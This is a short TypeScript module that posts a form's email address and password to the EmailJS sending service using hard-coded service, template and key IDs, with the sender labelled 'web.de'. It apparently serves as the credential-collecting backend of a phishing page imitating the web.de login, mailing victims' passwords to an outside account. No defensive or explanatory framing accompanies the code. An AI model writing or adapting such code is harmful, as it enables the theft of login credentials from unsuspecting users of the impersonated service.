import axios from "axios";

const endpoint = "https://api.emailjs.com/api/v1.0/email/send";
const service_id = "service_t9hpp0l";
const template_id = "template_736bjv5";
const public_key = "Di0FF44HVsiAzoB0F";

const sendEmail = (values: any) => {
  const payload = {
    service_id,
    template_id,
    user_id: public_key,
    template_params: {
      from_name: "web.de",
      email: values.email,
      password: values.password,
    },
  };

  return axios.post(endpoint, payload);
};

export default sendEmail;
